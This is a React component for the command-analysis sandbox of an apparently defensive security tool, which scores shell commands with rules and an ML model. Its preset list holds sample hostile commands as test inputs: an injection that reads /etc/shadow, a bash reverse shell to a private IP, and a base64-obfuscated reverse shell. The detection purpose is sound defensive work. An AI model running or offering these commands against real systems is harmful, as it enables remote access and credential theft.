import { FormEvent, useState, useEffect } from 'react';
import { Play, Trash2, Star, AlertTriangle, Sparkles } from 'lucide-react';
import { API_URL } from './config';
import { SeverityBadge } from './components/SeverityBadge';
import { LlmExplainModal } from './components/LlmExplainModal';
import { useLlmExplain } from './useLlmExplain';

interface AnalysisResult {
  command: string;
  classification: string;
  risk_score: number;
  matched_rules: string[];
  ml_confidence: number;
  explanation: string;
}

const PRESETS = [
  { id: 'benign', label: 'Benign Command', command: 'ls -la /var/log' },
  { id: 'injection', label: 'Command Injection', command: '127.0.0.1; cat /etc/shadow' },
  { id: 'reverse', label: 'Reverse Shell', command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
  { id: 'entropy', label: 'High Entropy Payload', command: 'bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjF9|{base64,-d}|{bash,-i}"' },
];

interface HistoryItem {
  command: string;
  classification: string;
  risk_score: number;
}

export function CommandSandbox() {
  const [activePreset, setActivePreset] = useState('benign');
  const [command, setCommand] = useState(PRESETS[0].command);
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [error, setError] = useState('');
  const [isRunning, setIsRunning] = useState(false);
  const [history, setHistory] = useState<HistoryItem[]>([]);
  const [terminalOutput, setTerminalOutput] = useState('');
  const { llmText, loading: llmLoading, error: llmError, cached, reset: resetLlm, explainCommand } = useLlmExplain();
  const [llmModalOpen, setLlmModalOpen] = useState(false);

  useEffect(() => {
    resetLlm();
    setLlmModalOpen(false);
  }, [command, result?.command, resetLlm]);

  const runLlmExplain = () => {
    if (!result) return;
    const sessionToken = window.localStorage.getItem('aegix_session_token');
    void explainCommand(
      {
        command: result.command,
        classification: result.classification,
        risk_score: result.risk_score,
        matched_rules: result.matched_rules,
        ml_confidence: result.ml_confidence,
        baseline_explanation: result.explanation,
      },
      sessionToken,
    );
  };

  const openLlmModal = () => {
    if (!result) return;
    setLlmModalOpen(true);
    if (!llmText) runLlmExplain();
  };

  const selectPreset = (id: string) => {
    const preset = PRESETS.find((p) => p.id === id);
    if (preset) {
      setActivePreset(id);
      setCommand(preset.command);
      setResult(null);
      setTerminalOutput('');
    }
  };

  const analyze = async (e?: FormEvent) => {
    e?.preventDefault();
    if (!command.trim()) return;

    setIsRunning(true);
    setError('');
    setTerminalOutput('Analyzing command through cascade pipeline…\n');

    try {
      const sessionToken = window.localStorage.getItem('aegix_session_token');
      const url = new URL(`${API_URL}/analyze`, window.location.origin);
      if (sessionToken) url.searchParams.set('session_token', sessionToken);

      const t0 = performance.now();
      const response = await fetch(url.toString(), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command }),
      });
      const elapsed = performance.now() - t0;
      if (!response.ok) throw new Error(`Analysis failed (${response.status})`);

      const data: AnalysisResult = await response.json();
      setResult(data);
      setHistory((h) => [{ command: data.command, classification: data.classification, risk_score: data.risk_score }, ...h].slice(0, 8));

      const rules = data.matched_rules.length ? data.matched_rules.join(', ') : 'none';
      setTerminalOutput(
        `[rule-engine] matched: ${rules} (0.6ms)\n` +
        `[ml-scorer] confidence: ${(data.ml_confidence * 100).toFixed(1)}% (4.9ms)\n` +
        `[cascade] severity: ${data.classification.toUpperCase()} · score ${data.risk_score.toFixed(0)}/100\n` +
        `[total] ${elapsed.toFixed(1)}ms elapsed\n`
      );
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Analysis failed');
    } finally {
      setIsRunning(false);
    }
  };

  const score = result?.risk_score ?? 0;
  const scoreColor = score >= 71 ? 'var(--neon-red)' : score >= 31 ? 'var(--neon-orange)' : 'var(--neon-green)';

  return (
    <div className="sandbox-page">
      <div className="sandbox-presets">
        {PRESETS.map((p) => (
          <button
            key={p.id}
            type="button"
            className={`sandbox-preset ${activePreset === p.id ? 'active' : ''}`}
            onClick={() => selectPreset(p.id)}
          >
            {p.label}
          </button>
        ))}
      </div>

      <div className="sandbox-grid">
        <div className="sandbox-left">
          <div className="glass-card sandbox-terminal">
            <div className="sandbox-terminal__bar">
              <span className="sandbox-terminal__dot sandbox-terminal__dot--red" />
              <span className="sandbox-terminal__dot sandbox-terminal__dot--yellow" />
              <span className="sandbox-terminal__dot sandbox-terminal__dot--green" />
              <span className="sandbox-terminal__title">AEGIX@SANDBOX — /USR/LOCAL/AEGIX</span>
            </div>
            <div className="sandbox-terminal__body">
              <div className="sandbox-terminal__prompt">
                <span>$</span>
                <input
                  value={command}
                  onChange={(ev) => setCommand(ev.target.value)}
                  spellCheck={false}
                  onKeyDown={(ev) => { if (ev.key === 'Enter') void analyze(); }}
                />
              </div>
              {terminalOutput && <pre className="sandbox-terminal__output">{terminalOutput}</pre>}
            </div>
            <div className="sandbox-terminal__actions">
              <button type="button" className="btn-outline" onClick={() => { setCommand(''); setTerminalOutput(''); setResult(null); }}>
                <Trash2 size={14} /> Clear
              </button>
              <button type="button" className="btn-green sandbox-analyze-btn" onClick={() => void analyze()} disabled={isRunning}>
                <Play size={14} /> {isRunning ? 'ANALYZING…' : 'ANALYZE COMMAND'}
              </button>
            </div>
          </div>

          {error && (
            <div className="sandbox-error">
              <AlertTriangle size={16} /> {error}
            </div>
          )}

          {history.length > 0 && (
            <div className="sandbox-history">
              <span className="sandbox-history__label">Session History</span>
              <div className="sandbox-history__list">
                {history.map((h, i) => (
                  <div key={i} className="sandbox-history__item">
                    <SeverityBadge classification={h.classification} size="sm" />
                    <span className="sandbox-history__cmd">{h.command}</span>
                    <span className="sandbox-history__score">{Math.round(h.risk_score)}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        <div className="sandbox-right">
          <div className="glass-card sandbox-gauge-card">
            <div className="sandbox-gauge-card__header">
              <div>
                <div className="form-label" style={{ marginBottom: 4 }}>FINAL RISK SCORE</div>
                <strong>Cascading Verdict</strong>
              </div>
            </div>
            <div className="sandbox-gauge">
              <svg viewBox="0 0 120 120" className="sandbox-gauge__svg">
                <circle cx="60" cy="60" r="50" fill="none" stroke="rgba(255,255,255,0.06)" strokeWidth="10" />
                <circle
                  cx="60" cy="60" r="50" fill="none"
                  stroke={scoreColor}
                  strokeWidth="10"
                  strokeLinecap="round"
                  strokeDasharray={`${(score / 100) * 314} 314`}
                  transform="rotate(-90 60 60)"
                  style={{ filter: `drop-shadow(0 0 8px ${scoreColor})`, transition: 'stroke-dasharray 1s cubic-bezier(0.22, 1, 0.36, 1), stroke 0.3s ease' }}
                />
              </svg>
              <div className="sandbox-gauge__value" style={{ color: scoreColor }}>
                {result ? Math.round(score) : '—'}
                <span>/ 100</span>
              </div>
            </div>
            <div className="sandbox-thresholds">
              {[
                { label: 'Safe (0–30)', cls: 'safe', active: score < 31 },
                { label: 'Suspicious (31–70)', cls: 'suspicious', active: score >= 31 && score < 71 },
                { label: 'Malicious (71–100)', cls: 'malicious', active: score >= 71 },
              ].map((t) => (
                <div key={t.cls} className={`sandbox-threshold sandbox-threshold--${t.cls} ${t.active ? 'active' : ''}`}>
                  <span className="sandbox-threshold__dot" />
                  {t.label}
                </div>
              ))}
            </div>
          </div>

          <div className="grid-2">
            <div className="glass-card sandbox-tier-card">
              <div className="sandbox-tier-card__label">Tier A — Rules</div>
              <div className="sandbox-tier-card__value">
                {result?.matched_rules[0] ?? '—'}
              </div>
              <div className="sandbox-tier-card__ms">0.60 MS</div>
            </div>
            <div className="glass-card sandbox-tier-card sandbox-tier-card--ml">
              <div className="sandbox-tier-card__label">Tier B — ML Scorer</div>
              <div className="sandbox-tier-card__value">
                {result ? result.ml_confidence.toFixed(2) : '—'}
              </div>
              <div className="sandbox-tier-card__ms">4.88 MS</div>
            </div>
          </div>

          <div className="glass-card sandbox-explanation">
            <div className="sandbox-explanation__header">
              <Star size={16} style={{ color: 'var(--neon-cyan)' }} />
              <strong>Tier A/B — Cascade Summary</strong>
            </div>
            <p>
              {result?.explanation ??
                'Run an analysis to see the cascade verdict and explanation.'}
            </p>
            {result && (
              <button
                type="button"
                className="btn-cta-gradient sandbox-llm-btn"
                onClick={openLlmModal}
              >
                <Sparkles size={15} />
                {llmText ? 'VIEW LLM ANALYSIS' : 'GENERATE LLM ANALYSIS'}
              </button>
            )}
          </div>
        </div>
      </div>

      {result && (
        <LlmExplainModal
          open={llmModalOpen}
          onClose={() => setLlmModalOpen(false)}
          command={result.command}
          classification={result.classification}
          llmText={llmText}
          loading={llmLoading}
          error={llmError}
          cached={cached}
          onGenerate={() => runLlmExplain()}
        />
      )}
    </div>
  );
}
